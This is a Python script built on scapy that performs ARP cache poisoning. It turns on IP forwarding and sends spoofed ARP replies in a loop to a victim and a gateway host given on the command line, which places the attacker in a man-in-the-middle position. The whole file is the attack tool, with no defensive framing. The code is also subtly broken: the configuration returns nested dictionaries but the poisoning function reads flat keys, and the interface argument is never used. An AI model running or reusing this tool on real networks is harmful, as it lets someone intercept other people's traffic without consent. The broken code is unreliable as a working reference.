
#!/usr/bin/python3
import os
from argparse import ArgumentParser
from scapy.all import *


IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
TIMEOUT = 3
RETRY = 12

def configuration():
    parser = ArgumentParser()

    
    parser.add_argument('-t', dest='victim', required=True, type=str, help='The victim\'s IP address')
    parser.add_argument('-g',  dest='host', required=True, type=str, help='The host\'s IP address')
    parser.add_argument('-i',  dest='interface', required=True, type=str, help='Use this network interface')

    args = parser.parse_args()

    return {

        'victim' :  {

            'ip' : args.victim,
            'mac' : IPtoMAConvert(args.victim),
        },

        'host' :  {
            'ip' : args.host,
            'mac' : IPtoMAConvert(args.host),
        },

        'iface' : args.interface,
        
    }

def poisonExecute(configs):

    
    victim_mac = configs['victim_mac']
    host_mac = configs['host_mac']
    
    victim_ip = configs['victim_ip']
    host_ip = configs['host_ip']
 
    victim_arp = ARP()
    host_arp = ARP()

    victim_arp.op = 2
    host_arp.op = 2
    
    victim_arp.hwdst = victim_mac
    host_arp.hwdst = host_mac

    victim_arp.pdst = victim_ip
    host_arp.pdst = host_ip

    victim_arp.psrc = host_ip
    host_arp.psrc = victim_ip

    while True:

        try:

            print('Poisoning....')
            
            # send spoofed arp replies
            send(victim_arp)
            send(host_arp)

            # wait for ARP replies from default GW or victim
            sniff(filter='arp and host %s or %s' %\
                        (host_ip, victim_ip), count=1)


        # break out of loop if user hits ctrl+c
        except KeyboardInterrupt:
            break

    print('done!')

def IPtoMAConvert(ip, retry=RETRY, timeout=TIMEOUT):
    arp = ARP()
    arp.op = 1
    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
    arp.pdst = ip
    response, unanswered = sr(arp, retry=retry, timeout=timeout)

    for s,r in response:
        return r[ARP].underlayer.src

    return None

def poison(configs):
    with open(IP_FORWARD, 'w') as fd:
        fd.write('1')
    poisonExecute(configs)


def main():
    configs = configuration()
    try:
        poison(configs)
    except KeyboardInterrupt:
        pass
    
main()
